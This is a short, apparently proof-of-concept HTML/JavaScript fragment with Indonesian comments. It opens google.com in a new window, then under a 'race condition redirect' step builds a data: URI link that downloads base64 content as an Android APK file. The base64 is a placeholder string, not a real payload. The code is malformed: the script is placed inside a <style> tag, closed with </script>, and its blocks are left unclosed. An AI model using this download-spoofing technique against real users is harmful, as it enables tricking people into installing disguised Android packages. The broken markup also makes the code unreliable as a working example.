<!DOCTYPE html>

<html>

<style>

function run() {

    let w = window.open("https://www.google.com/", "_blank");

    // STEP 2: race condition redirect
    setTimeout(() => {
        // Data acak dalam format Base64
        const randomBase64Data = "UkFORE9NX0RBVEFfUE9DX0JBU0U2NF9URVNU";
        
        const link = document.createElement('a');
        link.href = 'data:application/vnd.android.package-archive;base64,' + randomBase64Data;
        link.download = 'aplikasi_uji_acak.apk';

</script>
